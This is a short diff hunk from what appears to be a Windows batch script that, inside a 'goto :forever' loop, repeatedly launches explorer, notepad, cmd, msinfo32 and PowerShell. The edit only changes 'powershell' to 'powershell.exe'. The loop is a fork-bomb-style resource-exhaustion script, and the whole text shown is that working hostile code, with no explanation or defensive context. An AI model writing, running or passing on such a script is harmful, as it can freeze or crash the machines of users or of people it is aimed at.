@@ -4,5 +4,5 @@ start explorer.exe
 start notepad.exe
 start cmd.exe
 start msinfo32.exe
-start powershell
+start powershell.exe
 goto :forever
